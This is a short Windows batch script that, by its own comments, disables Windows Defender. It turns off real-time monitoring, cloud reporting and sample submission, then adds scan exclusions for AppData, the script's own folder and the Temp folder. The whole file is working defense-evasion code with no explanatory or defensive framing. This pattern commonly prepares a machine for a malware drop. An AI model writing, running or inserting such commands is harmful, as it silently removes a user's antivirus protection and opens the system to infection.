@echo off
:: Get APPDATA path and current script directory
set "appdataPath=%APPDATA%"
set "scriptDir=%~dp0"
set "scriptDir=%scriptDir:~0,-1%"  :: Remove trailing backslash

:: Disable Windows Defender protections
PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
PowerShell -Command "Set-MpPreference -MAPSReporting 0"
PowerShell -Command "Set-MpPreference -SubmitSamplesConsent 2"

:: Add exclusions using PowerShell
PowerShell -Command "Add-MpPreference -ExclusionPath '%appdataPath%'"
PowerShell -Command "Add-MpPreference -ExclusionPath '%scriptDir%'"
PowerShell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Temp'"
